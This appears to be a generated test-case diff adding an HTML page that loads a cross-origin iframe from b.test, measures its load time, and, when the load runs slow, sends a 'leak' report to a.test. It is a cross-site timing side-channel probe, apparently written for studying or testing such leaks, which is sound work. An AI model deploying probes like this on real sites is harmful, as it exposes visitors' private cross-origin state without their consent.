@@ -1,0 +1,15 @@
+<html>
+  <body>
+    <iframe id="targetIframe" src="https://b.test/GenAI-19-Examples-4o/c1233067/helper"></iframe>
+    <script>
+      const start = performance.now();
+      document.getElementById('targetIframe').onload = function () {
+        const end = performance.now();
+        const timing = end - start;
+        if (timing > 500) { // Arbitrary large value indicating potential error-induced delay
+          fetch('https://a.test/report/?leak=c1233067');
+        }
+      };
+    </script>
+  </body>
+</html>
